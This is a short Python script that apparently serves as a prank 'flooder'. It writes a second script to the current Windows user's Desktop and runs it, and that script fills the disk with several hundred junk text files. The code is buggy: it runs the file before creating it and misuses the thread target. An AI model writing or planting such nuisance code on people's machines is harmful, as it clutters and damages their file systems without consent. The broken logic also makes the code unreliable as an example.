import getpass
import os

fileCode = '''import threading
import random
def makefile():
    thing = random.randint(1, 100000)
    number = thing
    f = open('file.txt' + str(number), "w")
    f.write(':))))))')
    f.close()


threads = 512
while threads >= 0:
    print('making file')
    thread = threading.Thread(target=makefile())
    thread.start()
    threads -= 1
'''
curr_user = getpass.getuser()
pathst = "C:/Users/"
pathnd = '/Desktop/'
fullpath = pathst + curr_user + pathnd


def CreateFlooder():
    f = open(fullpath + 'flood.py', "w")
    print('making file')
    f.write(fileCode)
    f.close()


os.system(fullpath + 'flood.py')
CreateFlooder()
